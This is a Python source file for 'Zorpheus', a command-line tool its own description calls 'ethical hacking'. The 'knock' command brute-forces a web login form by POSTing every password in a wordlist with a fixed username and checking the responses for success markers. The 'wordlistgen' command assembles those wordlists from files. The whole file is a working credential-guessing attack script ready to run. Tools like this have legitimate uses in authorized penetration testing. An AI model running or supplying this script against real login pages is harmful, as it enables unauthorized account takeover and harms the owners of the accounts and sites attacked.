import requests
import argparse
import json

class Zorpheus:
    def knock(self, args):
        url = args["URL"]
        username_field = args.get("Username", None)
        password_field = args.get("Password", None)
        wordlist_path = args["Wordlist"]
        success_criteria = args.get("SuccessCriteria", {})

        with open(wordlist_path, "r") as f:
            wordlist = json.load(f)

        for password in wordlist["Passwords"]["words"]:
            data = {}
            if username_field:
                data[username_field] = wordlist["Usernames"]["words"][0]  
            if password_field:
                data[password_field] = password

            response = requests.post(url, data=data)

            if self.check_success(response, success_criteria):
                print("Credentials Found:")
                if username_field:
                    print(f"Username: {wordlist['Usernames']['words'][0]}")  
                if password_field:
                    print(f"Password: {password}")
                return

        print("Credentials not found in the wordlist.")

    def check_success(self, response, success_criteria):

        success_count = 0
        for criterion, value in success_criteria.items():
            if criterion == "StatusCode" and response.status_code == value:
                    success_count += 1
            elif criterion == "Keyword" and value in response.text:
                    success_count += 1
            elif criterion == "Header" and value in response.headers:
                    success_count += 1
            elif criterion == "Cookie" and value in response.cookies:
                    success_count += 1

        return success_count >= len(success_criteria) * 0.75  

    def wordlistgen(self, args):
        output = {"Usernames": {"words": []}, "Passwords": {"words": []}}

        for file_path in args:
            field_name = file_path.split('.')[0].capitalize() + "s"

            with open(file_path, 'r') as f:
                words = [line.strip() for line in f.readlines()]
                if "username" in file_path.lower():
                    output["Usernames"]["words"].extend(words)
                elif "password" in file_path.lower():
                    output["Passwords"]["words"].extend(words)

        return output

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zorpheus - A tool for ethical hacking")
    parser.add_argument("command", choices=["knock", "wordlistgen"], help="Choose a command to execute")
    parser.add_argument("arguments", nargs="+", help="Arguments for the command")
    args = parser.parse_args()

    zorpheus = Zorpheus()
    if args.command == "knock":
        arguments = json.loads(args.arguments[0])
        zorpheus.knock(arguments)
    elif args.command == "wordlistgen":
        arguments = args.arguments
        output = zorpheus.wordlistgen(arguments)
        print(json.dumps(output, indent=2))
